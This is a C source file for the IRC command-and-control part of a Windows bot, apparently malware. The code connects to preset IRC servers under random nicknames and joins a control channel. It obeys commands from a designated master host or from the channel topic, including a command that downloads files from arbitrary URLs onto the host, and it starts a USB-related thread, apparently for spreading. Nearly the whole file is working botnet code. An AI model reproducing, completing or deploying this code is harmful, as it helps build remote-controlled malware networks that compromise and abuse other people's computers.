#include "includes.h"
#include "externs.h"

static char string_nick[] = "NICK";
static char string_join[] = "JOIN";
static char string_part[] = "PART";
static char string_quit[] = "QUIT";
static char string_pass[] = "PASS";
static char string_ping[] = "PING";
static char string_pong[] = "PONG";
static char string_user[] = "USER";
static char string_privmsg[] = "PRIVMSG";
static char string_remove[] = "removing...";
static char string_download_failed[] = "Failed to start dl thread.";

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

thread_s		threads[MAX_THREADS];
BOOL			silent_main = FALSE;
BOOL			silent_all = FALSE;

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL NET_Initialize()
{
	WSADATA WSAdata;

	if (WSAStartup(MAKEWORD(2, 2), &WSAdata) != 0) 
	{
		return FALSE;
	}
	else
		return TRUE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Connect(char *host, unsigned short port)
{
	unsigned int		resv_host;
	struct sockaddr_in	address;
	SOCKET				sock;
	
	resv_host = Resolve(host);
	if (resv_host == 0)
		return -1;

	address.sin_addr.s_addr = resv_host;
	address.sin_family = AF_INET;
	address.sin_port = htons(port);

	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return -2;

	if (connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
		return -3;
	else
		return sock;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to)
{
	char	temp[64] = {0}, 
			buff[MAX_LINE];
	int		len;

	if (msg == MSG_PASS)
	{
		strncpy(temp, string_pass, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_NICK)
	{
		strncpy(temp, string_nick, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_USER)
	{
		strncpy(temp, string_user, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s \"\" \"lol\" :%s\r\n", 
			temp, buffer, buffer);
	}
	else if (msg == MSG_PONG)
	{
		strncpy(temp, string_pong, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_JOIN)
	{
		strncpy(temp, string_join, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s %s\r\n", temp, buffer, to);
	}
	else if (msg == MSG_PART)
	{
		strncpy(temp, string_part, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", temp, buffer);
	}
	else if (msg == MSG_PRIVMSG)
	{
		if (silent_all)
			return 1;
		else
		{
			strncpy(temp, string_privmsg, sizeof(temp) - 1);
			_snprintf(buff, sizeof(buff) - 1, "%s %s :%s\r\n", temp, to, buffer);
		}
	}
	else if (msg == MSG_QUIT)
	{
		strncpy(temp, string_quit, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s :%s\r\n", temp, buffer);
	}
	else
		// should never happen
		return 0;

	memset(temp, 0, sizeof(temp));

	len = send(sock, buff, strlen(buff), 0);

	memset(buff, 0, sizeof(buff));

	return len;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Login(SOCKET sock, char *password, char *nick, char *user)
{
	int		ret;

	if (password[0] != 0)
		if ((ret = IRC_Send(sock, MSG_PASS, password, NULL)) == SOCKET_ERROR)
			return ret;

	if ((ret = IRC_Send(sock, MSG_NICK, nick, NULL)) == SOCKET_ERROR)
		return ret;

	if ((ret = IRC_Send(sock, MSG_USER, user, NULL)) == SOCKET_ERROR)
		return ret;

	/* USB */
    
#ifndef NO_USB
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RemoteUSBThread, &sock, 0, 0);
#endif

	return 1;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_CheckTimeout(SOCKET sock)
{
	struct timeval		timeout;
	fd_set				fd;

	timeout.tv_sec = cfg_ircmaxwaittime;
	timeout.tv_usec = 0;

	FD_ZERO(&fd); 
	FD_SET(sock, &fd);

	return select(sock, &fd, NULL, NULL, &timeout);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL IRC_IsOrder(char *order)
{
	if (!strncmp(order, cfg_ircorderprefix, strlen(cfg_ircorderprefix)))
	{
		// remove order prefix
		memmove(order, order + strlen(cfg_ircorderprefix), strlen(order));

		return TRUE;
	}
	else
		return FALSE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

BOOL IRC_CheckHost(char *master)
{
	char	*host;

	host = strchr(master, '@');
	if (host == NULL)
		return FALSE;

	if (!strcmp(host + 1, cfg_irchost))
		return TRUE;
	else
		return FALSE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_ParseSingleCommand(SOCKET sock, char **word, int p, int words, char *from)
{
	if (words < 1)
		return 1;
	
	else if (words < 2)
		return 1;
	
	//silent all
	else if (!strcmp(word[p], cmd_silent))
	{
		if (!strcmp(word[p + 1], "on"))
			silent_all = TRUE;
		else
			silent_all = FALSE;

		return 1;
	}
	
	//join
	else if (!strcmp(word[p], cmd_join))
	{
		IRC_Send(sock, MSG_JOIN, word[p + 1], word[p + 2]);
		return 1;
	}
	
	//part
	else if (!strcmp(word[p], cmd_part))
	{
		IRC_Send(sock, MSG_PART, word[p + 1], NULL);
		return 1;
	}

	else if (words < 3)
		return 1;
	 
	//download
	else if (!strcmp(word[p], cmd_download))
	{
		download_s dl;

		_snprintf(dl.channel, sizeof(dl.channel) - 1, "%s", from);
		dl.ircsock = sock;

		dl.mode = atoi(word[p + 1]);
		_snprintf(dl.url, sizeof(dl.url) - 1, "%s", word[p + 2]);

		if (words == 4)
			_snprintf(dl.destination, sizeof(dl.destination) - 1, "%s", word[p + 3]);
		else
			dl.destination[0] = 0;

		dl.tnum = Thread_Add(T_DOWNLOAD);

		if ((threads[dl.tnum].tHandle = Thread_Start(DL_Thread, &dl, FALSE)) == NULL)
			IRC_Send(sock, MSG_PRIVMSG, string_download_failed, from);

		return 1; 
	}			   

	else if (words < 4)
		return 1;
	
	else if (words < 5)
		return 1;

	else if (words < 6)
		return 1;

	else
		return 1;
}	

int IRC_ParseAllCommands(SOCKET sock, char **word)
{
	int		i, 
			k, 
			pos,
			ret;
	char	*p,
			from[128] = {0};

	if (!strcmp(word[1], "332"))
		i = 4;
	else
		i = 3;

	// correction if its channel or user
	if (word[i-1][0] != '#')
	{
		p = strchr(word[0], '!');
		*p = 0;
		strncpy(from, word[0] + 1, sizeof(from) - 1);
	}
	else
		strncpy(from, word[i-1], sizeof(from) - 1);

	// first command correction (remove ":")
	memmove(word[i], word[i] + 1, strlen(word[i]));

	k = i + 1;
	pos = i;
	while (word[k] != NULL && k < MAX_WORDS)
	{
		if (IRC_IsOrder(word[k]))
		{
			if ((ret = IRC_ParseSingleCommand(sock, word, pos, k - pos, from)) < 0)
				return ret;

			pos = k;
		}
		k++;
	}

	return IRC_ParseSingleCommand(sock, word, pos, k - pos, from);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Parse(SOCKET sock, char *line)
{
	char	*word[MAX_WORDS],
			temp[64] = {0};
	int		i = 0;

	if (strstr(line, "001") != NULL)
		return IRC_Send(sock, MSG_JOIN, cfg_ircchannel, cfg_ircchanpass);

	word[i] = strtok(line, " ");
	while (word[i] != NULL)
	{
		i++;
		if (i == MAX_WORDS)
			break;
		word[i] = strtok(NULL, " ");
	}

	strncpy(temp, string_ping, sizeof(temp) - 1);
	if (!strcmp(word[0], temp))
	{
		memset(temp, 0, sizeof(temp));
		return IRC_Send(sock, MSG_PONG, word[1], NULL);
	}

	if (!strcmp(word[1], "433"))
			return IRC_Send(sock, MSG_NICK, GenerateNumber(4), NULL);
	
	strncpy(temp, string_privmsg, sizeof(temp) - 1);
	if (!strcmp(word[1], temp))
	{
		if (IRC_CheckHost(word[0]) && IRC_IsOrder(word[3] + 1))
			return IRC_ParseAllCommands(sock, word);
	}

	if (!strcmp(word[1], "332"))
	{
		if (IRC_IsOrder(word[4] + 1))
			return IRC_ParseAllCommands(sock, word);
	}

	return 0;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Listen(SOCKET sock)
{
	int		ret, 
			len,
			l;
	char	buffer[MAX_RECEIVE_BUFFER];

	while (sock > 0)
	{
		len = 0;
		memset(buffer, 0, sizeof(buffer));
		while ((ret = IRC_CheckTimeout(sock)) > 0)
		{
			if (len == MAX_RECEIVE_BUFFER - 1)
				break;
			l = recv(sock, buffer + len, 1, 0);
			if (l <= 0)
				return 0;
			len += l;
			if (buffer[len-1] == '\r' || buffer[len-1] == '\n')
				break;
		}
		
		if (ret <= 0)
			return ret;
		else if (len < 2)
			continue;
		else
		{
			buffer[len-1] = 0;
			if ((ret = IRC_Parse(sock, buffer)) < 0)
				return ret;
		}
	}

	return sock;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IRC_Begin()
{
	int			ircsock;
	int			i = 0, 
				ret = 1,
				tries = 0;

	while (1)
	{
		if (ircconnect[i].host == NULL)
		{
			i = 0;
			tries++;
		}

	if ((ircsock = IRC_Connect(ircconnect[i].host, ircconnect[i].port)) > 0)
		{
			i = 0;
			tries = 0;           
            if (IRC_Login(ircsock, ircconnect[i].password, GenerateNickA(), GenerateNumber(4)) > 0)
			{
				ret = IRC_Listen(ircsock);

				switch (ret)
				{
				case 0:

					break;
				case -1:	// SOCKET_ERROR

					break;
				case -2:

					break;
				case -3:

					i++;
					break;
				case -4:

					closesocket(ircsock);
					return ret;
				case -5:

					closesocket(ircsock);
					return ret;
				default:

					break;
				}

				closesocket(ircsock);
			}
		}
		else
		{
			i++;
		}

		Sleep(cfg_reconnectsleep);
	}

	// never reached
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

DWORD WINAPI IRC_Thread(LPVOID param)
{
	if (!NET_Initialize())
		ExitThread(0);
		
	srand(GetTickCount());

	Thread_Prepare();

	if (IRC_Begin() == -5)
	{
		//nothing
	}

	WSACleanup();

	ExitThread(0);
}
